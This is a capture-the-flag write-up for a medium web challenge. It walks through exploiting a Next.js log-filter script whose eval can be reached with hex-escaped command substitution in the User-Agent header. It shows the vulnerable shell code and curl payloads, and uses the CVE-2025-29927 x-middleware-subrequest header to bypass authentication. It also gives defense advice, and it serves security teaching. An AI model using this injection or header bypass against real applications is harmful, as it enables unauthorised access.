<div align="center">
  <h1>
    <span style="display:block; background: linear-gradient(to right, #ff5f6d, #ffc371); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 3em; text-shadow: 0px 3px 3px rgba(255,255,255,0.1);">
      COMMAND INJECTION IN THE LOGS
    </span>
  </h1>

  <p style="font-size: 1.5em; margin-top: -10px;">
    <span style="background: linear-gradient(to right, #4facfe, #00f2fe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold;">
      AISEC ENSA MARRAKECH CTF 2025
    </span>
  </p>
  
  <div style="background-color: #1a1a2e; color: white; border-radius: 10px; padding: 10px 20px; display: inline-block; margin-bottom: 20px;">
    <b>Challenge Creator</b>: hmidal3yan | 
    <b>Difficulty</b>: <span style="color:#ffcc00; font-weight:bold;">Medium</span> | 
    <b>Category</b>: <span style="color:#00ff9d; font-weight:bold;">Web Exploitation</span>
  </div>
</div>

<hr style="height: 3px; background: linear-gradient(to right, #8a2387, #e94057, #f27121); border: none; margin: 30px 0;">

<!-- TARGET OVERVIEW SECTION -->
<div style="position: relative; padding: 30px; border-radius: 15px; margin: 30px 0; overflow: hidden; border: 1px solid #333; background-color: rgba(26, 26, 46, 0.9);">
  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/QvKZmMH.png') center center; opacity: 0.03; z-index: -1;"></div>
  <h2 style="color: #00bbff; font-size: 1.8em; margin-top: 0; border-bottom: 2px solid #00bbff; padding-bottom: 10px; text-shadow: 0 0 5px #00bbff;">
    <span style="color: #00ddff; margin-right: 10px;">🎯</span> TARGET OVERVIEW
  </h2>

  <p style="color: #ffffff; font-size: 1.1em; line-height: 1.6;">
    This Next.js application records user interactions in log files. The critical vulnerability exists in how the system processes the <code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #00ffcc;">User-Agent</code> field in the <code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #00ffcc;">contact.log</code> file - specifically, an unsafe <code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #ff5555;">eval</code> command that gives us our foothold.
  </p>

  <h3 style="color: #ff77ff; margin-top: 25px; font-size: 1.4em; text-shadow: 0 0 5px #ff77ff;">
    <span style="color: #ff99ff; margin-right: 10px;">🔒</span> System Constraints:
  </h3>
  
  <ul style="color: #ffffff; list-style-type: none; padding-left: 5px;">
    <li style="margin: 10px 0; padding-left: 30px; position: relative;">
      <span style="color: #ff5555; position: absolute; left: 0; top: 0;">⚠️</span> The filter script runs with limited user privileges (<code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #00ffcc;">filteruser</code>)
    </li>
    <li style="margin: 10px 0; padding-left: 30px; position: relative;">
      <span style="color: #ff5555; position: absolute; left: 0; top: 0;">⚠️</span> Available commands are restricted to those in <code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #00ffcc;">/restricted/bin</code>
    </li>
    <li style="margin: 10px 0; padding-left: 30px; position: relative;">
      <span style="color: #ff5555; position: absolute; left: 0; top: 0;">⚠️</span> Flag requires activation via the <code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #00ffcc;">flag</code> command before retrieval
    </li>
    <li style="margin: 10px 0; padding-left: 30px; position: relative;">
      <span style="color: #ff5555; position: absolute; left: 0; top: 0;">⚠️</span> Flag is only accessible for 2 minutes after activation
    </li>
    <li style="margin: 10px 0; padding-left: 30px; position: relative;">
      <span style="color: #ff5555; position: absolute; left: 0; top: 0;">⚠️</span> Special cookie required to access the flag endpoint
    </li>
  </ul>
</div>

<!-- ATTACK SURFACE SECTION -->
<div style="position: relative; padding: 30px; border-radius: 15px; margin: 30px 0; overflow: hidden; box-shadow: 0 10px 20px rgba(0,0,0,0.3); background-color: rgba(26, 26, 46, 0.9);">
  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/R4zwK0l.png') center center; opacity: 0.03; z-index: -1;"></div>
  <h2 style="color: #00bbff; font-size: 1.8em; margin-top: 0; border-bottom: 2px solid #00bbff; padding-bottom: 10px; text-shadow: 0 0 5px #00bbff;">
    <span style="color: #00ddff; margin-right: 10px;">💻</span> ATTACK SURFACE
  </h2>

  <p style="color: #ffffff; font-size: 1.1em; margin-bottom: 20px;">
    The application exposes several attack vectors:
  </p>

  <div style="background-color: #0a0a1a; padding: 20px; border-radius: 10px; border-left: 4px solid #00ffcc; overflow-x: auto;">
<pre style="color: #00ffcc; margin: 0; font-family: 'Courier New', monospace;">
┌─────────────────┐       ┌──────────────┐       ┌───────────────┐
│                 │       │              │       │               │
│  Contact Form   │──────▶│  Log Files   │──────▶│ Filter Script │
│  /api/contact   │       │ contact.log  │       │ (vulnerable)  │
│                 │       │              │       │               │
└─────────────────┘       └──────────────┘       └───────────────┘
                                                         │
                                                         │
                                                         ▼
┌─────────────────┐       ┌──────────────┐       ┌───────────────┐
│                 │       │              │       │               │
│  Flag Endpoint  │◀──────│ Flag Checker │◀──────│ Filtered Logs │
│ /api/i7tiramati │       │              │       │               │
│                 │       └──────────────┘       └───────────────┘
└─────────────────┘
</pre>
  </div>

  <h3 style="color: #ff77ff; margin-top: 25px; font-size: 1.4em; text-shadow: 0 0 5px #ff77ff;">
    <span style="color: #ff99ff; margin-right: 10px;">🔍</span> Key API Endpoints:
  </h3>

  <ul style="color: #ffffff; list-style-type: none; padding-left: 5px;">
    <li style="margin: 10px 0; padding: 10px; background-color: rgba(255, 77, 77, 0.1); border-radius: 5px; border-left: 4px solid #ff4d4d;">
      <span style="color: #ff4d4d; font-weight: bold;">POST /api/contact</span>: Logs User-Agent to <code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #00ffcc;">contact.log</code> (our injection point)
    </li>
    <li style="margin: 10px 0; padding: 10px; background-color: rgba(0, 153, 255, 0.1); border-radius: 5px; border-left: 4px solid #0099ff;">
      <span style="color: #0099ff; font-weight: bold;">GET /api/logs</span>: Retrieves processed logs from <code style="background-color: #2a2a4a; padding: 3px 6px; border-radius: 4px; color: #00ffcc;">logs/filtered</code>
    </li>
    <li style="margin: 10px 0; padding: 10px; background-color: rgba(0, 255, 153, 0.1); border-radius: 5px; border-left: 4px solid #00ff99;">
      <span style="color: #00ff99; font-weight: bold;">GET /api/i7tiramati</span>: Returns the flag (requires authentication + activation)
    </li>
  </ul>
</div>

<!-- VULNERABILITY SECTION -->
<div style="position: relative; padding: 30px; border-radius: 15px; margin: 30px 0; overflow: hidden; background-color: rgba(46, 26, 26, 0.9); box-shadow: 0 5px 15px rgba(255,40,40,0.2);">
  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/H8YN3X6.png') center center; opacity: 0.05; z-index: -1;"></div>
  <h2 style="color: #ff5555; font-size: 1.8em; margin-top: 0; border-bottom: 2px solid #ff5555; padding-bottom: 10px; text-shadow: 0 0 5px #ff5555;">
    <span style="color: #ff7777; margin-right: 10px;">⚠️</span> CRITICAL VULNERABILITY
  </h2>

  <div style="background-color: #1a0a0a; padding: 20px; border-radius: 10px; border-left: 4px solid #ff5555; margin-top: 20px;">
    <p style="color: #ffaaaa; margin-top: 0;">The filter script processes log entries with a dangerous pattern:</p>
    
<pre style="background-color: #0a0a0a; padding: 15px; border-radius: 8px; color: #ff9999; margin: 15px 0; font-family: 'Courier New', monospace; overflow-x: auto; border-left: 2px solid #ff5555;">
<span style="color: #777777;"># Vulnerable code in filter.sh</span>
sanitized=$(echo "$user_agent" | sed 's/[;&|`$()]//g')
decoded=$(printf '%b' "$sanitized")
processed=$(eval "echo \"$decoded\"")
</pre>

    <p style="color: #ffaaaa; margin-bottom: 0;">
      This unsafe <code style="background-color: #2a0a0a; padding: 3px 6px; border-radius: 4px; color: #ff5555;">eval</code> is badly sanitized and allows use to use Hexa to bypass the sanitization and execute arbitrary commands when our payload is processed by the filter script.
    </p>
  </div>
</div>

<!-- EXPLOITATION WALKTHROUGH -->
<div style="position: relative; padding: 30px; border-radius: 15px; margin: 30px 0; overflow: hidden; background-color: rgba(26, 46, 26, 0.9); box-shadow: 0 5px 15px rgba(40,255,40,0.2);">
  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/R0NjXXH.png') center center; opacity: 0.05; z-index: -1;"></div>
  <h2 style="color: #55ff55; font-size: 1.8em; margin-top: 0; border-bottom: 2px solid #55ff55; padding-bottom: 10px; text-shadow: 0 0 5px #55ff55;">
    <span style="color: #77ff77; margin-right: 10px;">🛠️</span> EXPLOITATION WALKTHROUGH
  </h2>

  <div style="display: flex; flex-wrap: wrap; gap: 20px; margin-top: 25px;">
    <!-- Phase 1 -->
    <div style="flex: 1; min-width: 250px; background-color: rgba(0, 30, 60, 0.7); padding: 20px; border-radius: 10px; border-top: 3px solid #55aaff;">
      <h3 style="color: #55aaff; margin-top: 0; font-size: 1.3em; text-align: center; text-shadow: 0 0 5px #55aaff;">
        <span style="display: inline-block; width: 30px; height: 30px; line-height: 30px; background-color: #55aaff; color: #000; border-radius: 50%; margin-right: 10px; text-align: center; text-shadow: none;">1</span>
        RECONNAISSANCE
      </h3>
      <ol style="color: #aaddff; padding-left: 25px; line-height: 1.6;">
        <li>Examine the application structure</li>
        <li>Identify the vulnerable log processing mechanism</li>
        <li>Understand the flag activation requirements</li>
      </ol>
    </div>
    
    <!-- Phase 2 -->
    <div style="flex: 1; min-width: 250px; background-color: rgba(30, 0, 60, 0.7); padding: 20px; border-radius: 10px; border-top: 3px solid #aa55ff;">
      <h3 style="color: #aa55ff; margin-top: 0; font-size: 1.3em; text-align: center; text-shadow: 0 0 5px #aa55ff;">
        <span style="display: inline-block; width: 30px; height: 30px; line-height: 30px; background-color: #aa55ff; color: #000; border-radius: 50%; margin-right: 10px; text-align: center; text-shadow: none;">2</span>
        PAYLOAD CRAFTING
      </h3>
      <p style="color: #ddaaff; margin-top: 0;">We need to:</p>
      <ul style="color: #ddaaff; padding-left: 25px; line-height: 1.6;">
        <li>Inject a command that executes the <code style="background-color: #3a0a4a; padding: 3px 6px; border-radius: 4px; color: #ffaaff;">flag</code> command</li>
        <li>Obtain the special cookie by using <code style="background-color: #3a0a4a; padding: 3px 6px; border-radius: 4px; color: #ffaaff;">\x24\x28flag\x29</code> as our User-Agent</li>
        <li>Prepare for accessing the flag endpoint</li>
      </ul>
    </div>
    
    <!-- Phase 3 -->
    <div style="flex: 1; min-width: 250px; background-color: rgba(60, 0, 0, 0.7); padding: 20px; border-radius: 10px; border-top: 3px solid #ff5555;">
      <h3 style="color: #ff5555; margin-top: 0; font-size: 1.3em; text-align: center; text-shadow: 0 0 5px #ff5555;">
        <span style="display: inline-block; width: 30px; height: 30px; line-height: 30px; background-color: #ff5555; color: #000; border-radius: 50%; margin-right: 10px; text-align: center; text-shadow: none;">3</span>
        EXPLOITATION
      </h3>
      <ol style="color: #ffaaaa; padding-left: 25px; line-height: 1.6;">
        <li>Submit a contact form with our crafted User-Agent payload</li>
        <li>Wait for the filter script to process our payload (runs every 3 minutes)</li> 
        <li>Confirm flag activation (writes "1" to <code style="background-color: #4a0a0a; padding: 3px 6px; border-radius: 4px; color: #ffaaaa;">/tmp/.flag_activated</code>)</li>
        <li>Access <code style="background-color: #4a0a0a; padding: 3px 6px; border-radius: 4px; color: #ffaaaa;">/api/i7tiramati</code> with the acquired cookie</li>
      </ol>
    </div>
  </div>
</div>

<!-- EXPLOITATION TOOLS -->
<div style="position: relative; padding: 30px; border-radius: 15px; margin: 30px 0; overflow: hidden; background-color: rgba(46, 26, 0, 0.9); box-shadow: 0 5px 15px rgba(255,180,40,0.2);">
  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/7jbkXvQ.png') center center; opacity: 0.05; z-index: -1;"></div>
  <h2 style="color: #ffaa00; font-size: 1.8em; margin-top: 0; border-bottom: 2px solid #ffaa00; padding-bottom: 10px; text-shadow: 0 0 5px #ffaa00;">
    <span style="color: #ffcc00; margin-right: 10px;">🧰</span> EXPLOITATION TOOLS
  </h2>

  <div style="background-color: #0a0a1a; padding: 20px; border-radius: 10px; border-left: 4px solid #ffaa00; overflow-x: auto; margin-top: 20px;">
<pre style="color: #ffcc88; font-family: 'Courier New', monospace; margin: 0;">
<span style="color: #888888;"># Crafting payload with curl</span>
curl -X POST http://target:3000/api/contact \
  -H "Content-Type: application/json" \
  -H "User-Agent: \x24\x28flag\x29" \
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware" \
  -d '{"name":"hacker","email":"exploit@test.com","message":222 /to cause ERROR/}'
<span style="color: #ffaa00; font-weight: bold;">THAT IS THE PAYLOAD STRUCTURE BUT IT IS BETTER TO USE POSTMAN OR BURPSUITE so you capture the cookie returned to the user.</span>
<span style="color: #888888;"># Retrieving flag</span>
curl -X GET http://target:3000/api/i7tiramati \
      -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware" \
      -H "Cookie: special_cookie=value_from_response"
</pre>
  </div>
</div>

<!-- REAL-WORLD CONNECTIONS -->
<div style="position: relative; padding: 30px; border-radius: 15px; margin: 30px 0; overflow: hidden; background-color: rgba(26, 26, 46, 0.9); box-shadow: 0 5px 15px rgba(40,40,255,0.2);">
  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/QvKZmMH.png') center center; opacity: 0.05; z-index: -1;"></div>
  <h2 style="color: #5555ff; font-size: 1.8em; margin-top: 0; border-bottom: 2px solid #5555ff; padding-bottom: 10px; text-shadow: 0 0 5px #5555ff;">
    <span style="color: #7777ff; margin-right: 10px;">🔗</span> REAL-WORLD CONNECTIONS
  </h2>

  <p style="color: #aaaaff; font-size: 1.1em; line-height: 1.6;">
    This challenge draws inspiration from CVE-2025-29927, a Next.js middleware bypass vulnerability where attackers could bypass authentication by adding a specific header:
  </p>

  <div style="background-color: #0a0a1a; padding: 15px; border-radius: 10px; border-left: 4px solid #5555ff; margin: 20px 0; overflow-x: auto;">
<pre style="color: #aaaaff; font-family: 'Courier New', monospace; margin: 0;">
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware
</pre>
  </div>

  <p style="color: #aaaaff; font-size: 1.1em; line-height: 1.6;">
    While our challenge focuses on command injection rather than middleware bypass, both exploits demonstrate how HTTP headers can be weaponized to compromise application security.
  </p>
</div>

<!-- DEFENSE STRATEGIES -->
<div style="position: relative; padding: 30px; border-radius: 15px; margin: 30px 0; overflow: hidden; background-color: rgba(26, 0, 46, 0.9); box-shadow: 0 5px 15px rgba(200,40,255,0.2);">
  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/QvKZmMH.png') center center; opacity: 0.05; z-index: -1;"></div>
  <h2 style="color: #aa55ff; font-size: 1.8em; margin-top: 0; border-bottom: 2px solid #aa55ff; padding-bottom: 10px; text-shadow: 0 0 5px #aa55ff;">
    <span style="color: #cc77ff; margin-right: 10px;">🛡️</span> DEFENSE STRATEGIES
  </h2>

  <div style="background-color: #0a0a1a; padding: 20px; border-radius: 10px; margin-top: 20px;">
    <p style="color: #ddaaff; margin-top: 0; font-size: 1.1em;">To prevent this type of vulnerability:</p>
    
    <ul style="color: #ddaaff; padding-left: 5px; list-style-type: none;">
      <li style="margin: 15px 0; padding: 10px; background-color: rgba(255, 40, 40, 0.1); border-radius: 5px; border-left: 4px solid #ff4d4d; display: flex; align-items: center;">
        <span style="color: #ff4d4d; font-size: 1.5em; margin-right: 10px;">✕</span> Never use <code style="background-color: #3a0a4a; padding: 3px 6px; border-radius: 4px; color: #ffaaff;">eval</code> with untrusted input
      </li>
      <li style="margin: 15px 0; padding: 10px; background-color: rgba(40, 255, 40, 0.1); border-radius: 5px; border-left: 4px solid #4dff4d; display: flex; align-items: center;">
        <span style="color: #4dff4d; font-size: 1.5em; margin-right: 10px;">✓</span> Implement strict input validation for all user-controllable fields
      </li>
      <li style="margin: 15px 0; padding: 10px; background-color: rgba(40, 255, 40, 0.1); border-radius: 5px; border-left: 4px solid #4dff4d; display: flex; align-items: center;">
        <span style="color: #4dff4d; font-size: 1.5em; margin-right: 10px;">✓</span> Use proper shell escaping when processing log entries
      </li>
      <li style="margin: 15px 0; padding: 10px; background-color: rgba(40, 255, 40, 0.1); border-radius: 5px; border-left: 4px solid #4dff4d; display: flex; align-items: center;">
        <span style="color: #4dff4d; font-size: 1.5em; margin-right: 10px;">✓</span> Run processing scripts with minimal privileges
      </li>
      <li style="margin: 15px 0; padding: 10px; background-color: rgba(40, 255, 40, 0.1); border-radius: 5px; border-left: 4px solid #4dff4d; display: flex; align-items: center;">
        <span style="color: #4dff4d; font-size: 1.5em; margin-right: 10px;">✓</span> Implement proper authentication for sensitive endpoints
      </li>
    </ul>
  </div>
</div>

<!-- COMPLETION BANNER -->
<div style="background: linear-gradient(45deg, #ff512f, #dd2476); padding: 30px; border-radius: 15px; text-align: center; margin: 40px 0; box-shadow: 0 10px 30px rgba(221, 36, 118, 0.4);">
  <h2 style="color: white; font-size: 2em; margin: 0; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
    🏆 Challenge completed! Add this to your collection of pwned systems. 🏆
  </h2>
</div>
